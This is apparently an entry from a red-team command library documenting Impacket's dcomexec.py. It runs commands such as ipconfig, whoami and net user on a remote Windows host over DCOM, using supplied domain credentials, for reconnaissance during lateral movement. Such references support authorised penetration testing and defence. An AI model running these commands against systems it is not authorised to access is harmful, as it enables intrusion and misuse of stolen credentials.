---
type: command
executor: bash
data: >-
  dcomexec.py -share C$ -object MMC20 'DOMAIN/USERNAME:PASSWORD@TARGET_HOST'
  'ipconfig'
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Linux
tags:
  - lateral-movement
  - dcom
verified: true
validated: true
---

# DCOMExec Command with Output

## Command

```bash
dcomexec.py -share C$ -object MMC20 'DOMAIN/USERNAME:PASSWORD@TARGET_HOST' 'ipconfig'
```

## Description

Executes the 'ipconfig' command on the remote host via DCOM and retrieves the output, useful for reconnaissance during lateral movement.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -share C$ | Admin share for connection | Yes |
| -object MMC20 | COM object to instantiate | Yes |
| DOMAIN/USERNAME:PASSWORD@TARGET_HOST | Creds and target | Yes |
| 'ipconfig' | Command to execute | Yes |

## Examples

### Basic Usage

```bash
dcomexec.py -share C$ -object MMC20 'DOMAIN/USER:PASS@TARGET' 'whoami'
```

### Advanced with Kerberos

```bash
dcomexec.py -k -object MMC20 'DOMAIN/USER@TARGET' 'net user'
```

## Expected Output

Output from ipconfig, e.g.,

```
Windows IP Configuration

Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . : example.com
   IPv4 Address. . . . . . . . . . . : 192.168.1.100
```

## Related

- [[procedures/dcom-lateral-movement]]
- [[tools/Impacket]]
